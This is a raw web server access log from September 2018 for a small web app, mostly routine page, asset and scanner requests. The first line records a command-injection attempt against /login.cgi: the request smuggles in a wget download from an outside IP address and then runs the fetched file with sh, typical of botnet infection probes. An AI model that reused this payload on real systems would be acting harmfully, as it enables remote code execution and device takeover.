188.19.235.83 - - [01/Sep/2018:20:06:15 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.73.69.246/dl%20-O%20-%3E%20/tmp/.shinka2;sh%20/tmp/.shinka2%27$ HTTP/1.1" 400 173 "-" "Shinka/2.0" "-"
172.31.23.250 - - [11/Sep/2018:06:22:12 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:22:12 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:22:13 +0000] "GET /service-worker.js HTTP/1.1" 200 657 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:22:13 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:22:13 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:22:14 +0000] "GET /service-worker.js HTTP/1.1" 200 657 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:22:15 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:22:15 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:22:16 +0000] "GET /service-worker.js HTTP/1.1" 200 657 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:28:34 +0000] "GET /1.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:28:34 +0000] "GET /2.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:28:34 +0000] "GET /3.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:28:36 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:28:36 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:28:38 +0000] "GET /service-worker.js HTTP/1.1" 200 657 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:28:38 +0000] "GET /service-worker.js HTTP/1.1" 200 657 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:28:40 +0000] "GET /icon_192x192.cc66fc45e145e4c681a479fda2557b90.png HTTP/1.1" 200 18217 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:29:33 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:06:29:34 +0000] "GET /service-worker.js HTTP/1.1" 200 657 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "191.32.35.190"
172.31.13.179 - - [11/Sep/2018:06:32:55 +0000] "GET / HTTP/1.1" 200 1002 "-" "-" "77.96.81.157"
172.31.13.179 - - [11/Sep/2018:07:05:59 +0000] "GET / HTTP/1.1" 200 1002 "-" "-" "211.143.198.209"
172.31.23.250 - - [11/Sep/2018:07:20:41 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:20:41 +0000] "GET /1.jpg HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:20:41 +0000] "GET /2.jpg HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:20:41 +0000] "GET /2c3b51142672cfdd122ae499a725ae03.svg HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:20:41 +0000] "GET /3.jpg HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:20:41 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:20:42 +0000] "GET /precache-manifest.9c41e13d723d934762ea5672416742f6.js HTTP/1.1" 200 233 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:20:43 +0000] "GET /bundle.js HTTP/1.1" 200 82280 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:12 +0000] "GET / HTTP/1.1" 200 593 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:12 +0000] "GET /bundle.js HTTP/1.1" 200 82280 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:16 +0000] "GET /api/hello HTTP/1.1" 200 58 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:16 +0000] "GET /2c3b51142672cfdd122ae499a725ae03.svg HTTP/1.1" 200 1941 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:16 +0000] "GET /1.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:16 +0000] "GET /2.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:16 +0000] "GET /3.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:17 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:17 +0000] "GET /precache-manifest.9c41e13d723d934762ea5672416742f6.js HTTP/1.1" 200 233 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:19 +0000] "GET /manifest.fbdb4ac39e68880df733a90c1db0fcd5.json HTTP/1.1" 200 445 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:19 +0000] "GET /index.html HTTP/1.1" 200 593 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:19 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.23.250 - - [11/Sep/2018:07:21:19 +0000] "GET /bundle.js HTTP/1.1" 200 82280 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "191.32.35.190"
172.31.13.179 - - [11/Sep/2018:07:23:12 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "90.159.236.220"
172.31.23.250 - - [11/Sep/2018:07:52:31 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0" "196.52.43.120"
172.31.23.250 - - [11/Sep/2018:07:53:22 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "193.252.25.206"
172.31.23.250 - - [11/Sep/2018:08:06:47 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0" "62.4.14.206"
172.31.13.179 - - [11/Sep/2018:08:10:15 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)" "209.17.96.58"
172.31.23.250 - - [11/Sep/2018:08:11:54 +0000] "GET / HTTP/1.1" 200 593 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" "54.203.124.104"
172.31.23.250 - - [11/Sep/2018:08:34:34 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0" "195.154.61.206"
172.31.23.250 - - [11/Sep/2018:08:49:13 +0000] "GET / HTTP/1.1" 200 1002 "-" "-" "58.182.219.195"
172.31.23.250 - - [11/Sep/2018:09:26:10 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "201.245.164.252"
172.31.13.179 - - [11/Sep/2018:09:26:13 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "103.69.243.163"
172.31.13.179 - - [11/Sep/2018:10:29:29 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "5.160.209.12"
172.31.23.250 - - [11/Sep/2018:10:36:24 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" "46.152.49.38"
172.31.13.179 - - [11/Sep/2018:10:50:19 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "2.183.148.197"
172.31.23.250 - - [11/Sep/2018:11:07:00 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0" "60.191.38.77"
172.31.13.179 - - [11/Sep/2018:11:14:03 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "103.47.219.89"
172.31.23.250 - - [11/Sep/2018:12:21:59 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "190.5.44.2"
172.31.13.179 - - [11/Sep/2018:13:06:33 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "80.247.240.120"
172.31.23.250 - - [11/Sep/2018:13:10:23 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" "93.117.30.95"
172.31.23.250 - - [11/Sep/2018:13:37:15 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "88.248.16.130"
172.31.23.250 - - [11/Sep/2018:14:14:41 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "191.100.8.134"
172.31.23.250 - - [11/Sep/2018:14:42:12 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "152.249.92.199"
172.31.23.250 - - [11/Sep/2018:14:54:24 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "164.160.141.18"
172.31.13.179 - - [11/Sep/2018:15:00:35 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.13.179 - - [11/Sep/2018:15:00:36 +0000] "GET /precache-manifest.9c41e13d723d934762ea5672416742f6.js HTTP/1.1" 200 233 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.13.179 - - [11/Sep/2018:15:00:36 +0000] "GET /bundle.js HTTP/1.1" 200 82280 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:15:01:52 +0000] "GET / HTTP/1.1" 200 1002 "-" "-" "49.151.25.160"
172.31.13.179 - - [11/Sep/2018:15:03:24 +0000] "GET / HTTP/1.1" 200 1002 "-" "-" "58.177.55.90"
172.31.13.179 - - [11/Sep/2018:15:39:04 +0000] "GET / HTTP/1.1" 200 1002 "-" "-" "216.218.206.68"
172.31.23.250 - - [11/Sep/2018:16:09:41 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:16:09:47 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.13.179 - - [11/Sep/2018:16:11:13 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.13.179 - - [11/Sep/2018:16:11:14 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.13.179 - - [11/Sep/2018:16:11:14 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.13.179 - - [11/Sep/2018:16:11:23 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.13.179 - - [11/Sep/2018:16:11:23 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:16:33:45 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "170.233.45.249"
172.31.13.179 - - [11/Sep/2018:16:41:05 +0000] "GET / HTTP/1.1" 404 136 "-" "curl/7.43.0" "185.124.118.30"
172.31.23.250 - - [11/Sep/2018:16:41:20 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:41:20 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:41:20 +0000] "GET /2c3b51142672cfdd122ae499a725ae03.svg HTTP/1.1" 404 136 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:41:20 +0000] "GET /1.jpg HTTP/1.1" 404 136 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:41:20 +0000] "GET /3.jpg HTTP/1.1" 404 136 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:41:20 +0000] "GET /2.jpg HTTP/1.1" 404 136 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:41:22 +0000] "GET /precache-manifest.287640d19d55e64afb45ab92e273915c.js HTTP/1.1" 200 233 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:41:23 +0000] "GET /bundle.js HTTP/1.1" 200 82288 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:41:46 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:41:58 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
